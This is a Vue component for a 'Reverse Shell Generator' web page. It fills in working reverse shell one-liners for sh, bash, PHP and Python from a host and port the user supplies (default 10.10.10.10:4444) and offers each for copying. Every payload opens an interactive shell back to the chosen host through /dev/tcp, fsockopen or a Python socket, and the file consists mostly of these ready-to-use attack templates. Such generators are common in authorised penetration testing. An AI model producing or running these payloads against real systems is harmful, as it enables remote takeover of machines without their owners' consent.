<script setup lang="ts">
import { ref, computed } from 'vue'

const host = ref('10.10.10.10')
const port = ref('4444')
const copied = ref<string | null>(null)

interface Shell {
  id: string
  label: string
  build: (h: string, p: string) => string
}

const shells: Shell[] = [
  { id: 'sh', label: 'SH', build: (h, p) => `sh -i >& /dev/tcp/${h}/${p} 0>&1` },
  { id: 'bash', label: 'Bash', build: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1` },
  { id: 'php', label: 'PHP', build: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
  { id: 'python', label: 'Python', build: (h, p) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` },
]

const activeTab = ref('sh')
const activeShell = computed(() => shells.find(s => s.id === activeTab.value) ?? shells[0])
const activePayload = computed(() =>
  host.value && port.value
    ? activeShell.value.build(host.value, port.value)
    : 'Enter host and port to generate payload'
)

async function copyToClipboard(text: string, id: string) {
  try {
    await navigator.clipboard.writeText(text)
    copied.value = id
    setTimeout(() => { copied.value = null }, 2000)
  } catch { /* ignore */ }
}
</script>

<template>
  <div class="w-full space-y-6">
    <div class="space-y-1">
      <h1 class="text-title">Reverse Shell Generator</h1>
      <p class="text-sm text-main op-70">Generate reverse shell payloads for various languages</p>
    </div>

    <div class="grid sm:grid-cols-2 gap-4">
      <div class="space-y-2">
        <label for="host" class="text-sm text-main">Host/IP</label>
        <input id="host" v-model="host" type="text" placeholder="10.10.10.10" class="input" />
      </div>
      <div class="space-y-2">
        <label for="port" class="text-sm text-main">Port</label>
        <input id="port" v-model="port" type="text" placeholder="4444" class="input" />
      </div>
    </div>

    <div class="flex gap-2 border-b border-main !border-op-30 pb-2 flex-wrap">
      <button
        v-for="shell in shells"
        :key="shell.id"
        type="button"
        @click="activeTab = shell.id"
        :class="[
          'px-3 py-1.5 text-sm rd-1 transition-opacity duration-200 cursor-pointer decoration-none border-none bg-transparent text-link',
          activeTab === shell.id ? 'opacity-100 bg-neutral-500/15' : 'opacity-60 hover:opacity-100'
        ]"
      >
        {{ shell.label }}
      </button>
    </div>

    <div class="relative">
      <pre class="bg-hex-161b22 rd-1 p-4 text-sm font-mono text-main whitespace-pre-wrap break-all overflow-x-auto m-0"><code>{{ activePayload }}</code></pre>
      <button
        v-if="host && port"
        type="button"
        @click="copyToClipboard(activePayload, activeTab)"
        class="absolute top-2 right-2 btn-ghost h-7 w-7 p-0"
        aria-label="Copy"
      >
        <i v-if="copied === activeTab" class="i-mdi-check text-green-500" />
        <i v-else class="i-mdi-content-copy" />
      </button>
    </div>
  </div>
</template>
